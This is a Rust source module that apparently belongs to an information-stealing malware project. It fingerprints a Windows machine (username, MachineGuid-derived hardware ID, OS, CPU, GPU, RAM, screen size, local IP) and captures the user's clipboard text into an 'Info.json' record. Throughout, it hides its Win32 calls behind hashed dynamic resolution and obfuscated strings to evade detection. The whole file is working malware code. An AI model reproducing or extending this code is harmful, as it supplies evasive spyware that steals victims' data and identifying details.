//! System information + clipboard capture for Info.json.
//! All Win32 access goes through hashed dynamic resolution (resolve.rs).

use crate::info::Info;
use crate::resolve::{resolve, wide};

const HKEY_LOCAL_MACHINE: usize = 0x8000_0002;
const RRF_RT_ANY: u32 = 0x0000_ffff;

type FnRegGetValueW = unsafe extern "system" fn(
    hkey: usize,
    subkey: *const u16,
    value: *const u16,
    flags: u32,
    pdwtype: *mut u32,
    data: *mut u8,
    cbdata: *mut u32,
) -> i32;

fn reg_read_string(subkey: &str, value: &str) -> Option<String> {
    unsafe {
        let f: FnRegGetValueW = std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegGetValueW")));
        if f as usize == 0 {
            return None;
        }
        let mut buf = vec![0u8; 512];
        let mut len = buf.len() as u32;
        let status = f(
            HKEY_LOCAL_MACHINE,
            wide(subkey).as_ptr(),
            wide(value).as_ptr(),
            RRF_RT_ANY,
            std::ptr::null_mut(),
            buf.as_mut_ptr(),
            &mut len,
        );
        if status != 0 || len < 2 {
            return None;
        }
        let u16s = std::slice::from_raw_parts(buf.as_ptr() as *const u16, (len as usize) / 2);
        let end = u16s.iter().position(|&c| c == 0).unwrap_or(u16s.len());
        Some(String::from_utf16_lossy(&u16s[..end]).trim().to_string())
    }
}

fn username() -> String {
    type Fn = unsafe extern "system" fn(buf: *mut u16, size: *mut u32) -> i32;
    unsafe {
        let f: Fn = std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("GetUserNameW")));
        if f as usize == 0 {
            return String::new();
        }
        let mut buf = [0u16; 256];
        let mut size = 256u32;
        if f(buf.as_mut_ptr(), &mut size) == 0 {
            return String::new();
        }
        let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
        String::from_utf16_lossy(&buf[..end])
    }
}

fn local_ip() -> String {
    // GetIpAddrTable(iphlpapi): first non-loopback IPv4.
    type Fn = unsafe extern "system" fn(table: *mut u8, size: *mut u32, sorted: i32) -> u32;
    unsafe {
        let f: Fn = std::mem::transmute(resolve(&crate::obf!("iphlpapi.dll"), crate::api!("GetIpAddrTable")));
        if f as usize == 0 {
            return String::new();
        }
        let mut buf = vec![0u8; 64 * 1024];
        let mut size = buf.len() as u32;
        if f(buf.as_mut_ptr(), &mut size, 0) != 0 {
            return String::new();
        }
        let count = u32::from_le_bytes(buf[0..4].try_into().unwrap()) as usize;
        for i in 0..count {
            // MIB_IPADDRROW = 24 bytes: dwAddr, dwIndex, dwMask, dwBCastAddr, dwReasmSize, 2x u16
            let row = &buf[4 + i * 24..];
            let addr = u32::from_le_bytes(row[0..4].try_into().unwrap());
            let b = addr.to_le_bytes();
            if b[0] == 127 || addr == 0 {
                continue;
            }
            return format!("{}.{}.{}.{}", b[0], b[1], b[2], b[3]);
        }
        String::new()
    }
}

fn ram_gb() -> String {
    type Fn = unsafe extern "system" fn(buf: *mut u64) -> i32;
    unsafe {
        let f: Fn = std::mem::transmute(resolve("kernel32.dll", crate::api!("GlobalMemoryStatusEx")));
        if f as usize == 0 {
            return String::new();
        }
        let mut buf = [0u64; 8];
        buf[0] = 64; // dwLength
        if f(buf.as_mut_ptr()) == 0 {
            return String::new();
        }
        format!("{} GB", buf[1] / (1024 * 1024 * 1024))
    }
}

fn screen_size() -> String {
    type Fn = unsafe extern "system" fn(index: i32) -> i32;
    unsafe {
        let f: Fn = std::mem::transmute(resolve(&crate::obf!("user32.dll"), crate::api!("GetSystemMetrics")));
        if f as usize == 0 {
            return String::new();
        }
        format!("{}x{}", f(0), f(1))
    }
}

fn clipboard_text() -> String {
    type FnOpen = unsafe extern "system" fn(hwnd: usize) -> i32;
    type FnGet = unsafe extern "system" fn(fmt: u32) -> usize;
    type FnClose = unsafe extern "system" fn() -> i32;
    type FnLock = unsafe extern "system" fn(h: usize) -> *mut u16;
    unsafe {
        let open: FnOpen = std::mem::transmute(resolve(&crate::obf!("user32.dll"), crate::api!("OpenClipboard")));
        let get: FnGet = std::mem::transmute(resolve(&crate::obf!("user32.dll"), crate::api!("GetClipboardData")));
        let close: FnClose = std::mem::transmute(resolve(&crate::obf!("user32.dll"), crate::api!("CloseClipboard")));
        let lock: FnLock = std::mem::transmute(resolve("kernel32.dll", crate::api!("GlobalLock")));
        if open as usize == 0 || get as usize == 0 {
            return String::new();
        }
        let mut out = String::new();
        if open(0) != 0 {
            let h = get(13); // CF_UNICODETEXT
            if h != 0 {
                let p = lock(h);
                if !p.is_null() {
                    let mut len = 0;
                    while *p.add(len) != 0 && len < 64 * 1024 {
                        len += 1;
                    }
                    out = String::from_utf16_lossy(std::slice::from_raw_parts(p, len));
                }
            }
            close();
        }
        out
    }
}

fn now_utc() -> String {
    // GetSystemTime → SYSTEMTIME (8 x u16).
    type Fn = unsafe extern "system" fn(st: *mut u16);
    unsafe {
        let f: Fn = std::mem::transmute(resolve("kernel32.dll", crate::api!("GetSystemTime")));
        if f as usize == 0 {
            return String::new();
        }
        let mut st = [0u16; 8];
        f(st.as_mut_ptr());
        format!(
            "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
            st[0], st[1], st[3], st[4], st[5], st[6]
        )
    }
}

fn session_id() -> String {
    type FnTick = unsafe extern "system" fn() -> u64;
    type FnPid = unsafe extern "system" fn() -> u32;
    unsafe {
        let tick: FnTick = std::mem::transmute(resolve("kernel32.dll", crate::api!("GetTickCount64")));
        let pid: FnPid = std::mem::transmute(resolve("kernel32.dll", crate::api!("GetCurrentProcessId")));
        let t = if tick as usize != 0 { tick() } else { 0 };
        let p = if pid as usize != 0 { pid() as u64 } else { 0 };
        let seed = t ^ (p << 32) ^ 0x9e3779b97f4a7c15;
        format!("{seed:016X}{:016X}", t.wrapping_mul(0x2545F4914F6CDD1D))
    }
}

pub fn fill(info: &mut Info) {
    info.created_at = now_utc();
    info.session_id = session_id();
    info.username = username();
    info.hwid = reg_read_string(
        &crate::obf!(r"SOFTWARE\Microsoft\Cryptography"),
        &crate::obf!("MachineGuid"),
    )
        .map(|g| g.replace('-', "").to_uppercase()[..10.min(g.len())].to_string())
        .unwrap_or_default();
    info.operating_system =
        reg_read_string(
            &crate::obf!(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"),
            &crate::obf!("ProductName"),
        )
            .unwrap_or_else(|| "Windows".into());
    info.os_version = "64bit".into();
    info.cpu_name = reg_read_string(
        &crate::obf!(r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"),
        &crate::obf!("ProcessorNameString"),
    )
    .unwrap_or_default();
    info.gpu_name = reg_read_string(
        &crate::obf!(
            r"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000"
        ),
        &crate::obf!("DriverDesc"),
    )
    .unwrap_or_default();
    info.ram_size = ram_gb();
    info.screen_size = screen_size();
    info.ip_address = local_ip();
    info.clipboard = clipboard_text();
}
